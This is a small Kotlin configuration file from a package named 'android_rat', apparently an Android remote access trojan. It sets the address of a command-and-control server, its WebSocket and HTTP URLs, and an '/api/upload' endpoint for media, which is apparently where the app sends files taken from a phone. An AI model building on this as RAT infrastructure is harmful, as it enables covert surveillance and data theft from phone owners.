package com.example.android_rat.utils

object ServerUtils {
    const val serverHost = "192.168.1.162"

    // WebSocket configurations
    private const val serverWsPort = 80
    private const val serverWsProtocol = "http"
    const val serverWebsocketUrl = "$serverWsProtocol://$serverHost:$serverWsPort"

    // HTTP configurations
    private const val serverHttpProtocol = "http"
    private const val serverHttpPort = 80
    const val serverHttpUrl = "$serverHttpProtocol://$serverHost:$serverHttpPort"

    // Upload
    const val serverHttpMediaUploadUrl = "$serverHttpUrl/api/upload"

}
